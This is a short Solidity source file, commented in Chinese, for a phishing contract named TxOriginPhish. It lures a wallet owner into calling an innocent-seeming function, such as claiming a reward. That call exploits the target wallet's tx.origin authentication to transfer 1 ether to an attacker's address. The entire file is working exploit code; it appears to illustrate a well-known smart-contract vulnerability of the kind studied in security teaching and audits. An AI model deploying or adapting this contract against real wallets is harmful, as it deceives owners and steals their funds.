// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IWallet {
    function transfer(address payable to, uint256 amount) external;
}

/// @title TxOriginPhish - 钓鱼合约：诱使 owner 调用，绕过 tx.origin 鉴权
contract TxOriginPhish {
    IWallet public wallet;
    address payable public attacker;

    constructor(address _wallet, address payable _attacker) {
        wallet = IWallet(_wallet);
        attacker = _attacker;
    }

    /// owner 被骗到调用此函数（例如领取奖励），实际触发了 wallet.transfer
    /// 由于 wallet 用 tx.origin 鉴权，tx.origin 就是 owner，验证通过
    function attack() external {
        wallet.transfer(attacker, 1 ether);
    }
}
